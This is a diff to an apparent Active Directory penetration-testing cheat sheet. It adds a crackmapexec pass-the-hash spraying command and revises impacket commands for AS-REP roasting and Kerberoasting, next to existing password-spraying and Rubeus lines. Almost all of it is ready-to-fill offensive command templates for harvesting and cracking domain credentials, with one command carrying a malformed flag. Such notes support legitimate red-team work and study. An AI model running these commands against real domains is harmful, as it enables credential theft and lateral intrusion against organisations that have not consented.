@@ -14,6 +14,7 @@ net accounts
 
 #Linux
 crackmapexec smb <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
+crackmapexec smb <target_ips> -u <user_list> -H <hash> -d <domain> --continue-on-success
 crackmapexec winrm <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
 crackmapexec rdp <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
 
@@ -26,13 +27,14 @@ impacket-GetADUsers -all -dc-ip <dc_ip> <domain>/<username>
 
 #Roasting
 .\Rubeus.exe asreproast /nowrap
-impacket-GetNPUsers.py <domain>/ -usersfile <usernames.txt> - format hashcat -outputfile <hashes.txt>
+impacket-GetNPUsers.py <domain>/ -usersfile <usernames.txt> - format hashcat -outputfile hashes-asrep
+impacket-GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format hashcat -outputfile hashes-asrep
 ```
 #### Kerberoasting
 ```
 #Roasting
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-impacket-GetUserSPNs --request -dc-ip <ip> <domain>/<user>:<password>
+impacket-GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile hashes-kerb
 ```
 
 ### BloodHound
